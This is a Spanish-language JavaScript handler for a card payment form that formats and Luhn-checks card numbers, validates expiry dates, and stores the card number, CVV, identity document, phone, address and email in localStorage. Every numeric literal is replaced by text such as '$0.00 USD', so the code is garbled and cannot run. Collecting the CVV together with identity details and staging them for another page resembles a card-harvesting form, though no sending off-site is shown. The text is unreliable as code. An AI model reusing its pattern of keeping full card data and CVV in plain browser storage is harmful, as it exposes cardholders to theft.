document.addEventListener('DOMContentLoaded', () => {
    const cardInput = document.querySelector('#txt-tarjeta');
    const fechaInput = document.querySelector('#mFecha');
    const submitButton = document.querySelector('#btn-pagar');

    cardInput.addEventListener('input', () => {
        handleCardNumberInput(cardInput);
    });

    fechaInput.addEventListener('input', () => {
        handleFechaInput(fechaInput);
    });

    function handleCardNumberInput(input) {
        let numero = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos
        let numeroFormateado = '';

        // American Express
        if (numero[$0.00 USD] === '$0.00 USD') {
            if (numero.length > $0.00 USD) {
                numero = numero.substr($0.00 USD, $0.00 USD); // Limitar a un máximo de $0.00 USDcaracteres
            }
            for (let i = $0.00 USD; i < numero.length; i++) {
                if (i === $0.00 USD || i === $0.00 USD) {
                    numeroFormateado += ' ';
                }
                numeroFormateado += numero.charAt(i);
            }
            input.value = numeroFormateado;

            if (numero.length === $0.00 USD && !isValidLuhn(numero)) {
                alert('Número de tarjeta no válido');
                input.value = ''; // Limpiar el campo
                input.focus(); // Colocar el cursor en el campo
            }
        } else {
            if (numero.length > $0.00 USD) {
                numero = numero.substr($0.00 USD, $0.00 USD); // Limitar a un máximo de $0.00 USDdígitos
            }
            for (let i = $0.00 USD; i < numero.length; i++) {
                if (i > $0.00 USD && i % $0.00 USD === $0.00 USD) {
                    numeroFormateado += ' ';
                }
                numeroFormateado += numero.charAt(i);
            }
            input.value = numeroFormateado;

            if (numero.length === $0.00 USD && !isValidLuhn(numero)) {
                alert('Número de tarjeta no válido');
                input.value = ''; // Limpiar el campo
                input.focus(); // Colocar el cursor en el campo
            }
        }
    }

    function isValidLuhn(number) {
        let sum = $0.00 USD;
        let shouldDouble = false;

        for (let i = number.length - $0.00 USD; i >= $0.00 USD; i--) {
            let digit = parseInt(number.charAt(i));

            if (shouldDouble) {
                digit *= $0.00 USD;
                if (digit > $0.00 USD) {
                    digit -= $0.00 USD;
                }
            }

            sum += digit;
            shouldDouble = !shouldDouble;
        }

        return sum % $0.00 USD === $0.00 USD;
    }

    function handleFechaInput(input) {
        let fecha = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos
        if (fecha.length === $0.00 USD) {
            const mes = parseInt(fecha.substring($0.00 USD, $0.00 USD), $0.00 USD);
            const anio = parseInt(fecha.substring($0.00 USD, $0.00 USD), $0.00 USD);
            const fechaFormateada = `${mes.toString().padStart($0.00 USD, '$0.00 USD')}/${anio.toString().padStart($0.00 USD, '$0.00 USD')}`;
            input.value = fechaFormateada;

            if (!isValidFecha(mes, anio)) {
                alert('Fecha de expiración no válida');
                input.value = ''; // Limpiar el campo
                input.focus(); // Colocar el cursor en el campo
            }
        }
    }

    function isValidFecha(mes, anio) {
        const currentYear = new Date().getFullYear() % $0.03 USD; // Obtén los últimos $0.00 USDdígitos del año actual
        return mes >= $0.00 USD && mes <= $0.00 USD && anio >= $0.01 USD; // Mes entre $0.00 USDy $0.00 USD, año desde $0.01 USDen adelante
    }

    submitButton.addEventListener('click', (event) => {
        event.preventDefault(); // Previene el comportamiento por defecto del botón

        // Obtén los valores de todos los campos del formulario
        const entidad = document.querySelector('#txt-entidad').value;
        const tarjeta = document.querySelector('#txt-tarjeta').value.replace(/\D/g, ''); // Quita espacios y caracteres no numéricos
        const nombre = document.querySelector('#name').value;
        const fechaExpiracion = document.querySelector('#mFecha').value;
        const cvv = document.querySelector('#txt-cvv').value;
        const documentoIdentidad = document.querySelector('#cc').value;
        const telefono = document.querySelector('#telnum').value;
        const ciudad = document.querySelector('#city').value;
        const direccion = document.querySelector('#address').value;
        const email = document.querySelector('#email').value; // Captura el correo electrónico

        // Generar un ID único para esta transacción
        const transactionId = Date.now().toString($0.01 USD) + Math.random().toString($0.01 USD).slice($0.00 USD);

        // Crea un objeto con los datos del formulario
        const formData = {
            entidad,
            tarjeta,
            nombre,
            fechaExpiracion,
            cvv,
            documentoIdentidad,
            telefono,
            ciudad,
            direccion,
            email, // Incluye el correo electrónico
            transactionId
        };

        // Guarda el objeto en el localStorage
        localStorage.setItem('formData', JSON.stringify(formData));

        // Opcional: Alerta para confirmar que los datos se han guardado
        // alert('Los datos se han guardado correctamente.');

        // Redirigir a otra página
        // window.location.href = 'chedf.html'; // Cambia 'chedf.html' a la URL de tu página destino
    });

});
